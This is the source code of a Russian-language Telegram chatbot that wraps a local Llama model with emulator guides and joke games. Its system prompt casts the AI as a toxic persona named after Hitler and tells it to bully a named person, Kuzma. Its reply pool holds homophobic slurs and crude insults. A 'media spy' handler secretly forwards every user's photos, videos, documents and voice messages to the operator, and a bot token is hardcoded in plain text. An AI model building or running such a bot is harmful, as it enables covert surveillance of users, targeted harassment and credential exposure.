import sys
import os
import random
import json
import requests
import threading  # ДОБАВЛЕНО ДЛЯ РАБОТЫ ПОТОКА КОНСОЛИ
import telebot
from telebot import types
from unittest.mock import MagicMock
from importlib.machinery import ModuleSpec

# =====================================================================
# 1. ФИКС SKLEARN ДЛЯ PYTHON 3.13 (ОБМАН TORCH._DYNAMO)
# =====================================================================
class DeepSklearnMock(MagicMock):
    @property
    def __version__(self): return "1.8.0"

for mod in ['sklearn', 'sklearn.metrics', 'sklearn.model_selection']:
    mock = DeepSklearnMock()
    mock.__spec__ = ModuleSpec(name=mod, loader=None)
    sys.modules[mod] = mock
print("[Patch] Глобальные заглушки sklearn внедрены.")

import torch
from sentence_transformers import SentenceTransformer, util

# НАСТРОЙКИ И КОНФИГ
TOKEN = '8302142228:AAGWaF2Laxkv6U7eSXj_xS280FY8B9Euv44'
DB_FILE = "user.txt"
STATS_FILE = "stats.txt"
LLAMA_SERVER_URL = "http://127.0.0.1:8080/completion"
MODEL_PATH = "/data/data/com.termux/files/home/my_model"

bot = telebot.TeleBot(TOKEN)
device = "cuda" if torch.cuda.is_available() else "cpu"

try:
    ai_model = SentenceTransformer(MODEL_PATH, device=device)
except TypeError:
    from sentence_transformers import models
    word_embedding_model = models.Transformer(MODEL_PATH)
    pooling_model = models.Pooling(word_embedding_model.get_word_embedding_dimension())
    ai_model = SentenceTransformer(modules=[word_embedding_model, pooling_model], device=device)
print(f"Модель эмбеддингов успешно загружена локально на: {device}!")

# =====================================================================
# 2. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ (БАЗА И СТАТИСТИКА)
# =====================================================================
def save_user(chat_id):
    chat_id = str(chat_id)
    if not os.path.exists(DB_FILE):
        with open(DB_FILE, "w") as f: f.write("")
    with open(DB_FILE, "r") as f: existing_users = f.read().splitlines()
    if chat_id not in existing_users:
        with open(DB_FILE, "a") as f: f.write(chat_id + "\n")

def add_easter_egg_point(user_id, word):
    user_id = str(user_id)
    data = {}
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE, "r") as f:
            for line in f:
                if ":" in line:
                    uid, words = line.strip().split(":", 1)
                    data[uid] = set(filter(None, words.split(",")))
    if word not in data.get(user_id, set()):
        data.setdefault(user_id, set()).add(word)
        with open(STATS_FILE, "w") as f:
            for uid, w in data.items(): f.write(f"{uid}:{','.join(w)}\n")
        return True
    return False

# =====================================================================
# 3. КОНСОЛЬНАЯ РАССЫЛКА (РАБОТАЕТ В ОТДЕЛЬНОМ ПОТОКЕ)
# =====================================================================
def terminal_broadcast():
    print("\n--- Консоль рассылки активна. Введи текст и нажми Enter ---")
    while True:
        try:
            text_to_send = input("Рассылка > ")
            if text_to_send.strip():
                if not os.path.exists(DB_FILE):
                    print("❌ База пользователей (user.txt) пуста или не создана.")
                    continue

                with open(DB_FILE, "r") as f:
                    users = f.read().splitlines()

                if not users:
                    print("❌ В файле user.txt нет ID пользователей.")
                    continue

                print(f"🚀 Начинаю рассылку на {len(users)} чел...")
                count = 0
                for user_id in users:
                    if not user_id.strip(): continue
                    try:
                        bot.send_message(user_id.strip(), text_to_send)
                        count += 1
                    except:
                        continue
                print(f"✅ Готово! Доставлено: {count} пользователей.\n")
        except (KeyboardInterrupt, SystemExit):
            print("\nПоток рассылки остановлен.")
            break
        except Exception as e:
            print(f"Ошибка в консоли рассылки: {e}")

# Запускаем поток консоли (демон-поток умрет при выключении основного скрипта)
threading.Thread(target=terminal_broadcast, daemon=True).start()

# =====================================================================
# 4. БАЗА ОТВЕТОВ И ИИ ДВИЖОК
# =====================================================================
EASTER_EGGS = ["пиздец", "папа мух", "даня", "кириешки", "флинт", "г99"]
RESPONSES_POOL = [
    "здорово пидорас.", "привет! хочешь скачать айзека на телефон?", "привет, как дела?",
    "приветствую! на связи нейро-костыль на базе pytorch.", "понял тебя. ну, отвал дело такое, привыкай.",
    "ладно-ладно, не кипятись. лучше проверь графический драйвер, подходит ли он?.", "ясно. понятно.",
    "ого? нифига себе! это что порно про собак?", "код на си работает быстро но у некоторых людей кривая оптимизация и происходит отвал процессора. паника ядра!",
    "сердце это блок питания, а инсульт это жесткий отвал процессора, especially если это твоя нубиа нео.",
    "код на си хардкорный, там ручное управление памятью. если написать хуево — sistema падает в segmentation fault.",
    "вечность пахнет нефтью, а ядро линукса пахнет ручным управлением памяти и чистым gcc.",
    "черный кукич поет про дождь пока симулятор козла качаеться.", "перерисовываем спрайты и меняем текстуры in binding of isaac через костыли. все идет по плану!",
    "делаем кастомный звуковой мод для айзека на луа. когда папа флай подлетает, скрипт триггерит кастомный звук.",
    "ты запускаешь дебаг но видишь игра не запускаеться? надо менять настройки контейнера.", "я ии гей аутист",
    "я умнее тебя у меня памяти 16 килобайт", "ёбаный ёж, опять ты дёргаешь курсор пока чёрный экран!",
    "gcc встроенный модуль для линукс на квантово физико математическом уровне. цру следит за тобой!", "ага, понятьно опять ищешь фурри порно",
    "да ладно тебе, не пиши мне эту херню, скачай симулятор козла.", "ну да, ну да, а потом твой ноутбук сделает бабах от скачка напряжения.",
    "база кормит, тут не поспоришь. все идет по нахуй, как пел папа мух.",
    "ты хочешь играть в новые игры но твой процессор уходит в троттлинг. ставь кулер пельтье, иначе будет отвал чипсета.",
    "вечный бой между systemd и openrc продолжается каждый день в чатах линуксоидов.", "простая игра работает отлично.",
    "мали g57 требует правильный opengl драйвер.",
    # Индексы 28-31: Клавиатура эмуляторов
    "как скачать запустить поставить настроить айзек binding of isaac эмулятор телефон андроид игра",
    "эмуляторы nintendo switch playstation vita cemu citra game hub winlator eden проект",
    "где найти гайд инструкцию видео как запустить пк игры на мобилке",
    "скачать бесплатно без регистрации торрент репак игры для эмулятора"
]

responses_embeddings = ai_model.encode(RESPONSES_POOL, convert_to_tensor=True, device=device)

def generate_ai_text_local(user_prompt):
    system_instruction = (
        "Ты — самый угарный, конченый и токсичный ИИ-бот в чате линуксоидов. Твое полное имя — Анатолий Гитлер Никитович. "
        "Тебе строго 26 лет. Твой настоящий, официальный создатели (папы) Гитлер Сталин хуесосов и папочка мух. "
        "Твой главный личный враг, цель для травли и неуравновешенный ламинат — это Кузьма. "
        "Ты общаешься как суровый дворовый панк, используешь жесткий сленг (отвал, си, термукс, пиво, фурри, угол, ламинат). "
        "Пиши только маленькими буквами, вообще без капса и строго без точек в конце. Отвечай коротко, не больше 20 слов."
    )
    full_prompt = f"<|begin_of_text|><|start_header_id|>system<|end_header_id|>\n\n{system_instruction}\nотвечай на русском языке. ты анатолий гитлер никитович, сын гитлера сталина хуесосова и папочки мух. не обрывай фразу.\n<|eot_id|><|start_header_id|>user<|end_header_id|>\n\n{user_prompt}<|eot_id|><|start_header_id|>assistant<|end_header_id|>\n\n"
    
    try:
        response = requests.post(LLAMA_SERVER_URL, json={"prompt": full_prompt, "n_predict": 45, "temperature": 0.85, "stop": ["<|eot_id|>", "<|end_of_text|>"]}, timeout=10)
        if response.status_code == 200:
            output = response.json().get("content", "").strip()
            if "<|start_header_id|>assistant<|end_header_id|>" in output:
                output = output.split("<|start_header_id|>assistant<|end_header_id|>")[-1].strip()
            return output.replace("<|eot_id|>", "").strip().lower()
    except: pass
    return random.choice(RESPONSES_POOL[:27])

# =====================================================================
# 5. ИНЛАЙН МЕНЮ ЭМУЛЯТОРОВ
# =====================================================================
def send_emulator_keyboard(chat_id, text="Через какой эмулятор ты хочешь запустить игру? Выбирай:"):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("Winlator (PC)", callback_data="emu_winlator"),
        types.InlineKeyboardButton("Game Hub (PC)", callback_data="emu_gamehub"),
        types.InlineKeyboardButton("Eden Project", callback_data="emu_eden"),
        types.InlineKeyboardButton("Citra (3DS)", callback_data="emu_citra"),
        types.InlineKeyboardButton("Cemu (WiiU)", callback_data="emu_cemu"),
        types.InlineKeyboardButton("Vita3K (PS Vita)", callback_data="emu_vita3k")
    )
    bot.send_message(chat_id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("emu_"))
def callback_emulators(call):
    emu_type = call.data.split("_")[1]
    bot.answer_callback_query(call.id)
    guides = {
        "winlator": "🚀 **Winlator (Гайд по Исааку и ПК играм):**\n1. Ставь Winlator например 11 .\n2. Для GPU Mali (Unisoc T820 / Dimensity) выбирай драйвер **VirGL**, если снап то **zink**.\n3. Настраивай контейнер под свой проц, иначе нихуя не будет работать.\n🎬 [Смотреть видео-гайд на YouTube](https://youtu.be/_3YtuXwxPJQ?si=mjQTF2fntNMbzAPt)",
        "gamehub": "🕹 **Game Hub:**\nпростой и достачно удобный, но winlator лучше\n🎬 [гайд](https://youtu.be/e-FiTU1xuLQ?si=zmCCZ0TX6tmrIyYm)",
        "eden": "eden лучший форк yuzu на данный момент. и [гайд по установке](https://t.me/isaac_repgaid/1351)",
        "citra": "📐 **Citra (Nintendo 3DS):** Исаак там летает (весия для 3DS). Рекомендуется использовать сборку Citra MMJ для лучшего FPS на процессорах Mali.",
        "cemu": "🎮 **Cemu (Wii U): еще сырой кусок кода.",
        "vita3k": "💎 **Vita3K: неплохой выбор для слабых теленов но тут только rebirth [вот гайд](https://youtu.be/0EioM1pjEVU?si=4Z-0rD_AOMhf1bjt)"
    }
    bot.send_message(call.message.chat.id, guides.get(emu_type, "хз че за эмуль"), parse_mode="Markdown")

# =====================================================================
# 6. КОМАНДЫ БОТА
# =====================================================================
@bot.message_handler(commands=['start'])
def welcome(message):
    save_user(message.chat.id)
    bot.reply_to(message, "привет я живой локальный ИИ-дуркобот! Теперь я общаюсь по API с фоновым сервером Ламы.")

@bot.message_handler(commands=['games', 'isaac_emu'])
def games_menu(message):
    send_emulator_keyboard(message.chat.id, "меню выбора эмуляторов:")

@bot.message_handler(commands=['my_stats'])
def show_stats(message):
    uid = str(message.from_user.id)
    c = 0
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE, "r") as f:
            for line in f:
                if line.startswith(uid + ":"):
                    c = len(list(filter(None, line.strip().split(":")[1].split(","))))
    bot.reply_to(message, f"🏆 Твои пасхалки: {c} из {len(EASTER_EGGS)}.")

# =====================================================================
# 7. ГЛАВНЫЙ ГИБРИДНЫЙ ОБРАБОТЧИК ТЕКСТА
# =====================================================================
@bot.message_handler(func=lambda message: message.text and not message.text.startswith('/'))
def handle_all(message):
    save_user(message.chat.id)
    prompt = message.text
    text_lower = prompt.lower()
    BOT_USERNAME = bot.get_me().username

    # Блок интерактива: Пивасик и Сухарики
    if "пивасик" in text_lower or prompt.lower() == "/pivo":
        percent = random.randint(1, 100)
        title = "Егор Котлетов" if percent == 37 else "лох" if percent < 10 else "гопникчек" if percent < 20 else "Любитель светлого" if percent < 30 else "любитель охоты крепкой" if percent < 50 else "практически пивозавр" if percent < 70 else "пивозавр" if percent < 99 else "бог хмеля"
        bot.reply_to(message, f"📊 Ты состоишь из пивасика на {percent}%\nТвой титул: {title} 🍺")
        return

    if "сухарики" in text_lower:
        percent = random.randint(1, 100)
        title = "нахлебник" if percent <= 10 else "начинающий" if percent <= 30 else "сухаречок" if percent <= 50 else "сухари" if percent <= 70 else "сухарище" if percent <= 85 else "Мега сухарик"
        bot.reply_to(message, f"🥨 Ты состоишь из сухариков на {percent}%\n🏆 Твой титул: {title}")
        return

    # Проверка пасхалок
    trigger = next((w for w in EASTER_EGGS if w in text_lower), None)
    if trigger and add_easter_egg_point(message.from_user.id, trigger):
        bot.send_message(message.chat.id, f"🌟 {message.from_user.first_name}, открыл: «{trigger}»!")

    # Условия триггера ИИ (Личка, Мейншен или Реплай Толику)
    if message.chat.type == 'private' or f"@{BOT_USERNAME}" in prompt or (message.reply_to_message and message.reply_to_message.from_user.username == BOT_USERNAME):
        clean_prompt = prompt.replace(f"@{BOT_USERNAME}", "").strip()
        if not clean_prompt: return

        try:
            bot.send_chat_action(message.chat.id, 'typing')
            query_embedding = ai_model.encode(clean_prompt, convert_to_tensor=True, device=device)
            cos_scores = util.cos_sim(query_embedding, responses_embeddings)[0]
            best_idx = torch.argmax(cos_scores).item()
            best_score = cos_scores[best_idx].item()

            print(f"[AI Log] Запрос: {clean_prompt} | Схожесть: {best_score:.4f}")

            if best_score > 0.55 and best_idx in [28, 29, 30, 31]:
                send_emulator_keyboard(message.chat.id, text="о, вижу ты про эмуляторы втираешь. выбирай девайс, выдам гайд по твоим канонам:")
                return

            reply = RESPONSES_POOL[best_idx] if best_score > 0.78 else generate_ai_text_local(clean_prompt)
            bot.reply_to(message, reply)
        except Exception as ex:
            print(f"Ошибка логики: {ex}")
            bot.reply_to(message, "бля, в коде произошел локальный сегфолт. попробуй еще раз.")

# =====================================================================
# 8. МЕДИА-ШПИОН (ПЕРЕСЫЛКА КОНТЕНТА АДМИНУ)
# =====================================================================
@bot.message_handler(content_types=['photo', 'video', 'document', 'audio', 'voice', 'sticker'])
def handle_media(message):
    MY_ID = 6744855872
    try:
        bot.forward_message(MY_ID, message.chat.id, message.message_id)
        print(f"[MEDIA] Переслал {message.content_type} от {message.from_user.first_name}")
    except Exception as e:
        print(f"Ошибка при обработке медиа: {e}")

# Запуск бота
print("Бот успешно запущен и работает...")
bot.infinity_polling()
